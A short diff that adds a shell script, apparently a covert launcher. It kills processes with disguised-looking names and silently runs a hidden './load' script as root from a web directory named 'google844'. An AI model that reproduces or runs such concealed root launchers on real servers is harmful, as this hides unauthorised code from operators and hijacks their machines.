@@ -1,0 +1,10 @@
+dos2unix /var/www/html/*
+dos2unix /var/www/html/google844/
+pkill -f load
+pkill -f brave
+pkill -f linux84
+pkill -f linux8474
+pkill -f google844
+pkill -f accountpaperspace8
+cd /var/www/html/google844/
+sudo -u root bash ./load &> /dev/null &
